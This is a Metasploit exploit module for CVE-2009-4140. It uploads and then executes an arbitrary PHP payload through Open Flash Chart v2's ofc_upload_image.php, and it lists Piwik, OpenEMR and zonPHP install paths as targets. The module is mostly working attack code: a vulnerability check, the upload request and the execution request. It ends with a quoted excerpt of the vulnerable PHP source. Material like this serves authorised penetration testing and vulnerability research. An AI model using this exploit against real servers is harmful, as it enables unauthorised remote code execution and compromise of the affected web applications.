# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Open Flash Chart v2 Arbitrary File Upload",
      &#039;Description&#039;    => %q{
          This module exploits a file upload vulnerability found in Open Flash
        Chart version 2. Attackers can abuse the &#039;ofc_upload_image.php&#039; file
        in order to upload and execute malicious PHP files.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Braeden Thomas&#039;, # Initial discovery + Piwik PoC
          &#039;Gjoko Krstic <gjoko[at]zeroscience.mk>&#039;, # OpenEMR PoC
          &#039;Halim Cruzito&#039;, # zonPHP PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;,   &#039;37314&#039;],
          [&#039;CVE&#039;,   &#039;2009-4140&#039;],
          [&#039;OSVDB&#039;, &#039;59051&#039;],
          [&#039;EDB&#039;,   &#039;10532&#039;]
        ],
      &#039;Payload&#039;        =>
        {
            &#039;Space&#039;       => 8190, # Just a big value, injection on HTTP POST
            &#039;DisableNops&#039; => true,
            &#039;BadChars&#039;    => "\x00"
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Targets&#039;        =>
        [
          # Tested on:
          # * open-flash-chart v2-Lug-Wyrm-Charmer
          #   set TARGETURI /php-ofc-library/
          # * open-flash-chart v2-beta-1
          #   set TARGETURI /php-ofc-library/
          # * zonPHP v2.25
          #   set TARGETURI /zonPHPv225/ofc/
          # * Piwik v0.4.3
          #   set TARGETURI /piwik/libs/open-flash-chart/php-ofc-library/
          # * OpenEMR v4.1.1
          #   set TARGETURI /openemr-4.1.1/library/openflashchart/php-ofc-library/
          [ &#039;Generic (PHP Payload)&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Dec 14 2009&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Open Flash Chart&#039;, &#039;/php-ofc-library/&#039;])
        ], self.class)
  end

  #
  # Check for ofc_upload_image.php
  #
  def check
    print_status("#{peer} - Sending check")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, "ofc_upload_image.php"),
    })
    if not res
      print_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    elsif res.code.to_i == 404
      print_error("#{peer} - No ofc_upload_image.php found")
    elsif res and res.code == 200 and res.body =~ /Saving your image to/
      vprint_status("#{peer} - Found ofc_upload_image.php")
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit

    # Upload
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    print_status("#{peer} - Uploading &#039;#{@fname}&#039; (#{payload.encoded.length} bytes)...")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;ofc_upload_image.php&#039;),
      &#039;ctype&#039;    => "",
      &#039;vars_get&#039; => { &#039;name&#039; => "#{@fname}" },
      &#039;data&#039;     => "<?php #{payload.encoded} ?>"
    })
    if not res
      fail_with(Failure::Unknown,  "#{peer} - Request timed out while uploading")
    elsif res.code.to_i == 404
      fail_with(Failure::NotFound, "#{peer} - No ofc_upload_image.php found")
    elsif res.body =~ /can&#039;t write file/
      fail_with(Failure::Unknown,  "#{peer} - Unable to write &#039;#{@fname}&#039;")
    elsif res.body =~ /Saving your image to: (.+)#{@fname}/
      path = $1
      register_files_for_cleanup(@fname)
      print_status("#{peer} - Executing &#039;#{path}#{@fname}&#039;")
    else
      fail_with(Failure::NotVulnerable, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end

    # Execute
    res = send_request_raw({
      &#039;uri&#039; => normalize_uri(target_uri.path, path, @fname)
    })
    if res and res.code == 404
      fail_with(Failure::NotFound, "#{peer} - Not found: #{@fname}")
    end

  end
end

#
# Source
#
=begin ofc_upload_image.php
20-// default path for the image to be stored //
21-$default_path = &#039;../tmp-upload-images/&#039;;

23-if (!file_exists($default_path)) mkdir($default_path, 0777, true);

25-// full path to the saved image including filename //
26-$destination = $default_path . basename( $_GET[ &#039;name&#039; ] );

28-echo &#039;Saving your image to: &#039;. $destination;

39-$jfh = fopen($destination, &#039;w&#039;) or die("can&#039;t open file");
40-fwrite($jfh, $HTTP_RAW_POST_DATA);
41-fclose($jfh);
=end

